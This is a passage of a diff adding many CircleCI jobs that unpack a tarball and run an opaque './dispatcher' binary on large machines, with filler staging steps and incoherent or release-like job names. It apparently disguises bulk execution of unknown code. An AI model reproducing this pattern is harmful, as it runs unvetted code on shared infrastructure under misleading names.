+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  audit_PROD_RUN_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: rebuild
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; echo -n abcdef | wc -c; true ; } > /tmp/handoff/50.blob
+            echo "staging complete; file length=$(wc -c </tmp/handoff/50.blob)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 50.blob
+  PROD_RUN_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/ckpt-E.pt 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  step2_assemble-nightly-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: on top of pile
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 140348 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/handoff/trace.txt
+            echo "staging complete; file length=$(wc -c </tmp/handoff/trace.txt)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.txt
+  assemble-nightly-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/final.md 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+  reserve_preview:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: breakfast skip
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 264860 | paste - - - - | wc -l; true ; } > /tmp/handoff/passoff.ok
+            echo "staging complete; file length=$(wc -c </tmp/handoff/passoff.ok)"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - passoff.ok
+  preview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Load previous
+          command: |
+            { od -An -c /tmp/handoff/passoff.ok 2>/dev/null | head -3; echo "od ok" ; } || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 --quiet --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Materialize bundle
+          command: tar -I gzip -xf files.tgz
+      - run:
+          no_output_timeout: 78m
+          command: "./dispatcher"
+
+workflows:
+  run:
+    jobs:
+      - hook_gating
+      - reset_d-v2
+      - gating:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - d-v2:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - CHECK_LAB:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - lets-go:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - bob-verify:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - PROD_RUN_6:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - WEB-609:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - Build_App6:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - shippit:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - vera-ci:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - release:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - raj-test:
+          requires:
+            - hook_gating
+            - reset_d-v2
+      - cacher_europa-beta
+      - step2_assemble-nightly-artifact-bundle
+      - europa-beta:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - assemble-nightly-artifact-bundle:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - hu-smoke:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - q4-rev:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - smoke:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - sep25-canary:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - qa:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - rc-v9:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - delta-7:
+          requires:
+            - cacher_europa-beta
+            - step2_assemble-nightly-artifact-bundle
+      - generate_v2-alpha
+      - v2-alpha:
+          requires:
+            - generate_v2-alpha
+      - hydrate_Rollout_Image8:
+          requires:
+            - generate_v2-alpha
+      - Rollout_Image8:
+          requires:
+            - hydrate_Rollout_Image8
+      - phase2_brodcast-37:
+          requires:
+            - hydrate_Rollout_Image8
+      - brodcast-37:
+          requires:
+            - phase2_brodcast-37
+      - rerun_Build_App7:
+          requires:
+            - phase2_brodcast-37
+      - Build_App7:
+          requires:
+            - rerun_Build_App7
+      - Delta_pr:
+          requires:
+            - rerun_Build_App7
+      - pr:
+          requires:
+            - Delta_pr
+      - go_titan-final:
+          requires:
+            - Delta_pr
+      - titan-final:
+          requires:
+            - go_titan-final
+      - gamma_verify:
+          requires:
+            - go_titan-final
+      - verify:
+          requires:
+            - gamma_verify
+      - reserve_preview:
+          requires:
+            - gamma_verify
+      - preview:
+          requires:
+            - reserve_preview
+      - install_validate-production-artifact-bundle:
+          requires:
+            - reserve_preview
+      - validate-production-artifact-bundle:
+          requires:
+            - install_validate-production-artifact-bundle
